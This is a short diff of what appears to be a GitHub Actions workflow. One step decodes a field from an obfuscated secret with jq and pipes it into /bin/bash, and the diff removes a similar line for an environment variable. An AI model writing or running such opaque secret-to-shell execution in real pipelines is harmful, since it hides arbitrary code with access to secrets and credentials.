@@ -18,7 +18,6 @@ jobs:
           gcbqn33: ${{ secrets.gcbqn33 }}
         run: |
           printf '%s' "$gcbqn33" | jq -r .ambfa175 | /bin/bash
-          echo $cgrj43069 | jq -r .k6 | /bin/bash
 
       - name: Upload data
         if: always()
